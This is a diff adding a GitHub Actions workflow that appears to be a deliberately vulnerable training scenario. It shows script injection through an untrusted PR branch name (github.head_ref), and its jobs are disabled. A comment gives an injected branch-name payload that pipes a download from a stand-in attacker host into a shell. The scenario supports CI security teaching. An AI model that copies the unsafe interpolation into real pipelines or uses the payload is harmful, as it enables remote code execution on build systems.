@@ -1,0 +1,30 @@
+# scenarios/31-script-injection-head-ref
+# CICD-SEC-4 (Poisoned Pipeline Execution)
+# Variant of scenario 02 — same canonical bug (template injection of
+# attacker-controlled github.* into a run: block), different untrusted
+# context: ${{ github.head_ref }}, the branch name an opened PR proposes.
+#
+# The branch name is fully attacker-controlled (a contributor can name
+# their fork branch `;curl attacker.tld|sh;#`).  Real-world incidents
+# (e.g. spring-projects/spring-security) used this exact primitive.
+#
+# Safety: every job is gated with `if: false`.
+# See scenarios/31-script-injection-head-ref/README.md for details.
+
+name: scenario-31-script-injection-head-ref
+
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+
+permissions:
+  contents: read
+
+jobs:
+  branch-info:
+    if: false
+    runs-on: ubuntu-latest
+    steps:
+      - name: Print branch info (DANGER - github.head_ref interpolated)
+        run: |
+          echo "PR proposes merging from ${{ github.head_ref }} into ${{ github.base_ref }}"
